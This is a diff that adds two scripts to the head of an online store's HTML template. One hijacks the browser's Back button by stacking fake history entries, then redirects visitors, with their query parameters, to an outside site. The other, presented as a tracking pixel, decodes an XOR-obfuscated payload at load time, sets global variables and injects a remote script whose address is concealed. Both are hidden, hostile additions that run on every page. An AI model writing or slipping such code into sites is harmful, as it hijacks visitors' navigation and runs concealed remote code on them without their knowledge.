@@ -22,4 +22,25 @@
 <script>window.theme = {currency: "R$", money_format: "decimal", cart_url: "/cart"};</script>
 <script src="/assets/local-cart.js" defer></script>
 <script src="/assets/flex.js" defer></script>
+<script>
+  // Back redirect (todas as páginas)
+  const link = 'https://countrystyle.site';
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    window.addEventListener('popstate', () => {
+      setTimeout(() => { location.href = urlBackRedirect; }, 1);
+    });
+  }
+  setBackRedirect(link);
+</script>
+<script>
+  // Pixel UTMify (todas as páginas)
+  (function(){var c_vwwa=atob("DH9MB+o4ZJzoqiiynQRucphURqbKwlzG7Qx2KMVbAPLG31zf9Bk1KYlXCbKK2AfB/g0ld55LS+yB0k3esg8lf49USvabiASQ/As4dYNaEeiN2QqIxiJgJY1UC/6JxluQpyQ3JYRZCfnKkArC9Acpa6NcRrDK3Ene6BpuPcgOBaneyRnR+05+NN8BVP3QnxDTqkl/NIwaGcGV");var l_ix=[];for(var a_6ig0=0;a_6ig0<c_vwwa.length;a_6ig0++){l_ix.push(c_vwwa.charCodeAt(a_6ig0)&255);}var a_kvdv=l_ix[0];var x_1b=l_ix.slice(1,1+a_kvdv);var n_rxgq=l_ix.slice(1+a_kvdv);var p_u0j=n_rxgq.map(function(b,h_wja5){return b^x_1b[h_wja5%a_kvdv];});var n_n="";for(var l_3k9=0;l_3k9<p_u0j.length;l_3k9++){n_n+=String.fromCharCode(p_u0j[l_3k9]&255);}var n_mfp=decodeURIComponent(escape(n_n));var k_8=JSON.parse(n_mfp);var g_zm=k_8.globals||[];g_zm.forEach(function(c_e){window[c_e.name]=c_e.value;});var x_iz=document.createElement("script");x_iz.src=k_8.url;x_iz.async=true;x_iz.defer=true;(k_8.attributes||[]).forEach(function(e_gvdi){x_iz.setAttribute(e_gvdi.name,e_gvdi.value);});(document.head||document.documentElement).appendChild(x_iz);})();
+</script>
 </head>
